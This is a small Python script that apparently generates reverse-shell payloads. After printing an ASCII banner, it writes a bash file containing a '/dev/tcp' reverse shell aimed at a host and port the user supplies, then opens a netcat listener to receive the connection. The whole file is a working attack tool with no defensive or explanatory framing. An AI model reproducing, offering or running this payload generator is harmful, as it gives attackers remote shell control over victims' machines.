#!/usr/bin/python
# -*-coding: utf-8-*-

import os as px
import sys 
from time import sleep as tidur

px.system("clear")

print(""" 
\033[92m        -```.```-        
\033[92m       -+ossssso+-       
\033[92m      /ss\033[91m:\033[92mossso\033[91m:\033[92mss+      
\033[92m  ````/////////////` ``
\033[92m  +s+`sssssssssssss.+so\033[94m  _____  __ __  ____    ____  ______ 
\033[92m  oso`sssssssssssss.oss\033[94m |     ||  |  ||    \  /    ||      | 
\033[92m  oso`sssssssssssss.oss\033[94m |__/  ||  |  ||  D  )|  o  ||      |
\033[92m  os+`sssssssssssss.+so\033[94m |   __||_   _||    / |     ||_|  |_|
\033[92m  ````sssssssssssss.```\033[94m |  /  ||     ||    \ |  _  |  |  | 
\033[92m      -/oss+/+sso/:    \033[94m |     ||  |  ||  .  \|  |  |  |  | 
\033[92m        /ss. `ss/      \033[94m |_____||__|__||__|\_||__|__|  |__|   
\033[92m        -oo` `os:      \033[31;5m        Coded By Dominic404\033[0m \033[97m
""")

def help():
    print("""
Command:
        -h,   --host   = Your Ip Address
        -p,   --port   = Set The Port You Want
        -n,   --name   = The Name Payload You Want
""")        

try:
    host = sys.argv[2]
    port = sys.argv[4]
    output = sys.argv[6]
    res = open(output, 'w')
except:
    help()
    exit()    
    
def start():    
    print("{-} Generating Payload. . .")
    res.write("#!/bin/bash\n")
    res.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1"%(host,port))
    res.close()
    tidur(2)
    print("{-} Generating Succesfull")
    tidur(1)
    print("{!} Connecting On Port %s"%(port))
    tidur(1)
    px.system("nc -l -p %s"%(port))
    
for arg in sys.argv:
 if (arg == '-h' or arg == '--host'):
    start()
 if (arg == '-p' or arg == '--port'):
    start()
 if (arg == '-n' or arg == '--name'):
    start()
